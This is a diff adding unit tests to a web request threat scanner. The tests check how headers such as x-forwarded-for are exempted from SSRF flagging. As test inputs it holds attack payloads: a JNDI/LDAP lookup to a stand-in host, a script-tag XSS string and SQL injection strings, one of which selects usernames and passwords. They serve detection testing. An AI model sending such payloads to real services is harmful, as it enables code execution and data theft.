@@ -550,3 +550,114 @@ describe('excluded detection fields config (guard-core parity)', () => {
     expect(queryHit).toBe(true);
   });
 });
+
+describe('excluded detection headers (guard-core parity)', () => {
+  const SCRIPT = '<script>alert(1)</script>';
+  const JNDI = '${jndi:ldap://evil.example/a}';
+  const SQLI = "203.0.113.10' OR '1'='1'";
+  const headerRequest = (headers: Record<string, string>) =>
+    createMockRequest({ headers });
+
+  it('defaults the header exclusion set to empty', () => {
+    const parsed = SecurityConfigSchema.parse({});
+    expect(parsed.excludedDetectionHeaders).toEqual([]);
+  });
+
+  it('does not flag address-carrying proxy identity headers by default', async () => {
+    const manager = await makeManager();
+    for (const headers of [
+      { 'x-forwarded-for': '192.168.65.1' },
+      { 'x-real-ip': '10.0.0.5, 172.16.0.1' },
+      { 'cf-connecting-ip': '127.0.0.1' },
+      { 'x-envoy-external-address': '127.0.0.1:8080' },
+      { host: '169.254.169.254' },
+    ]) {
+      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers));
+      expect(isThreat).toBe(false);
+    }
+  });
+
+  it('does not flag structured proxy header values by default', async () => {
+    const manager = await makeManager();
+    for (const headers of [
+      { forwarded: 'for=127.0.0.1;proto=https' },
+      { 'x-forwarded-proto': 'https' },
+    ]) {
+      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers));
+      expect(isThreat).toBe(false);
+    }
+  });
+
+  it('still scans excluded headers for always-scan and per-category payloads', async () => {
+    const manager = await makeManager();
+    for (const headers of [
+      { 'x-forwarded-for': JNDI },
+      { 'user-agent': JNDI },
+      { 'x-real-ip': JNDI },
+      { 'x-forwarded-for': SQLI },
+      { 'user-agent': SCRIPT },
+    ]) {
+      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers));
+      expect(isThreat).toBe(true);
+    }
+  });
+
+  it('keeps the full category scan on non-excluded headers', async () => {
+    const manager = await makeManager();
+    const [ssrfHit] = await scanRequestWithManager(
+      manager,
+      headerRequest({ 'x-not-a-proxy-header': '192.168.65.1' }),
+    );
+    expect(ssrfHit).toBe(true);
+
+    const [sqliHit] = await scanRequestWithManager(
+      manager,
+      headerRequest({ 'x-plain-header': "1 UNION SELECT username, password FROM users--" }),
+    );
+    expect(sqliHit).toBe(true);
+  });
+
+  it('configured exclusions suppress ssrf only', async () => {
+    const manager = await makeManager();
+    const config = createTestConfig({ excludedDetectionHeaders: ['x-custom-proxy-ip'] });
+
+    const [addressSuppressed] = await scanRequestWithManager(
+      manager,
+      headerRequest({ 'x-custom-proxy-ip': '10.0.0.5' }),
+      config,
+    );
+    expect(addressSuppressed).toBe(false);
+
+    const [chainSuppressed] = await scanRequestWithManager(
+      manager,
+      headerRequest({ 'x-custom-proxy-ip': '10.0.0.5, 172.16.0.1' }),
+      config,
+    );
+    expect(chainSuppressed).toBe(false);
+
+    for (const headers of [
+      { 'x-custom-proxy-ip': SCRIPT },
+      { 'x-custom-proxy-ip': JNDI },
+      { 'x-other-header': '192.168.65.1' },
+    ]) {
+      const [isThreat] = await scanRequestWithManager(manager, headerRequest(headers), config);
+      expect(isThreat).toBe(true);
+    }
+
+    const [unconfigured] = await scanRequestWithManager(
+      manager,
+      headerRequest({ 'x-custom-proxy-ip': '10.0.0.5' }),
+    );
+    expect(unconfigured).toBe(true);
+  });
+
+  it('empty exclusion config keeps the ordinary header scan', async () => {
+    const manager = await makeManager();
+    const [isThreat] = await scanRequestWithManager(
+      manager,
+      headerRequest({ 'x-plain-header': SCRIPT }),
+      createTestConfig({}),
+    );
+    expect(isThreat).toBe(true);
+  });
+});
